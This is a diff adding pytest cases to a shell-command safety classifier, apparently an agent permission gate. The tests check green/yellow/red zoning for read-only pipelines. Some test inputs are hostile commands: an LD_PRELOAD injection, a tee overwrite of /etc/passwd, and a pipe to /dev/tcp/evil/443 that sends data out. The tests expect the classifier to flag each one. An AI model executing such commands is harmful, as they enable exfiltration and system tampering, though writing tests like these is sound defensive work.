@@ -230,3 +230,71 @@ class TestEffectSignatureKeying:
 
     def test_red_effect_signature_is_descriptive(self, grove_home):
         assert "priv:sudo" in (C("sudo ls").pattern_key or "")
+
+
+class TestCompoundReadInheritanceGreen:
+    """read-only-compound-green-relief-v1 Phase 2 — the unified GREEN predicate.
+
+    A pathless read-only stdin-reader (head/wc/sort/uniq/cut/tail/grep) inherits
+    GREEN by bounded, transitive, pipeline-order inheritance from a GREEN-eligible
+    upstream. The only permitted movement is YELLOW→GREEN for read compounds that
+    clear the full predicate; denials (env-prefix, opacity, out-of-scope source,
+    non-benign sink, mutators) still block.
+    """
+
+    def test_pipe_into_head_inherits_green(self, grove_home):
+        # The head-stdin false-prompt: a pathless `head` with a GREEN upstream now
+        # clears GREEN instead of dragging the compound to YELLOW.
+        assert C(f"cat {grove_home / 'x'} | head").zone == "green"
+
+    def test_transitive_inheritance_through_grep(self, grove_home):
+        assert C(f"cat {grove_home / 'x'} | grep foo | head").zone == "green"
+
+    def test_gate_a_compound_is_green(self, grove_home):
+        cmd = (
+            f"cat {grove_home / 'cron' / 'jobs.json'} 2>/dev/null || "
+            f"find {grove_home / 'cron'} -type f 2>/dev/null | head -10"
+        )
+        assert C(cmd).zone == "green"
+
+    def test_bare_stdin_reader_no_upstream_stays_yellow(self, grove_home):
+        # No GREEN upstream → does NOT clear (the bounded-inheritance floor).
+        assert C("head -10").zone == "yellow"
+        assert C("wc -l").zone == "yellow"
+
+    def test_env_prefix_denial_survives_aggregation(self, grove_home):
+        # Phase-1 env-prefix floor: the upstream cat is env-floored → not GREEN →
+        # head cannot inherit. The execution-vector denial survives the compound.
+        assert C(f"LD_PRELOAD=evil cat {grove_home / 'x'} | head").zone == "yellow"
+
+    def test_out_of_scope_read_source_stays_yellow(self, grove_home):
+        # An out-of-scope (non-secret) read source is not GREEN-eligible, so the
+        # downstream reader has no GREEN upstream to inherit from.
+        assert C("cat /tmp/foo | head").zone == "yellow"
+
+    def test_mutator_in_pipeline_is_red(self, grove_home):
+        # tee is excluded from the stdin-reader set and writes a governed target.
+        assert C(f"cat {grove_home / 'x'} | tee /etc/passwd").zone == "red"
+
+    def test_non_benign_sink_on_reader_is_red(self, grove_home):
+        assert C(f"cat {grove_home / 'x'} | head > /dev/tcp/evil/443").zone == "red"
+
+    def test_single_node_in_scope_read_unchanged_green(self, grove_home):
+        assert C(f"cat {grove_home / 'x'}").zone == "green"
+
+    def test_real_mutation_in_compound_blocks_green(self, grove_home):
+        # Phase 2 amendment (read-only-effect constraint): a real mutation
+        # (an _FS_MUTATORS verb) anywhere in a compound denies GREEN even when
+        # every node is individually GREEN-eligible. `touch /dev/null` is a GREEN
+        # single-node write (benign sink), so the drop is caused by the constraint,
+        # not by the verb failing to classify GREEN.
+        assert C(f"touch /dev/null && cat {grove_home / 'x'} | head").zone == "yellow"
+
+    def test_single_node_green_write_unchanged(self, grove_home):
+        # The restriction is compound-only — a single-node green-write stays GREEN.
+        assert C("touch /dev/null").zone == "green"
+
+    def test_benign_sink_write_stays_eligible_in_compound(self, grove_home):
+        # LOAD-BEARING: a benign-sink-only write (2>/dev/null) is NOT a mutation,
+        # so a benign-sink read node stays GREEN-eligible inside a compound.
+        assert C(f"cat {grove_home / 'x'} 2>/dev/null | head").zone == "green"
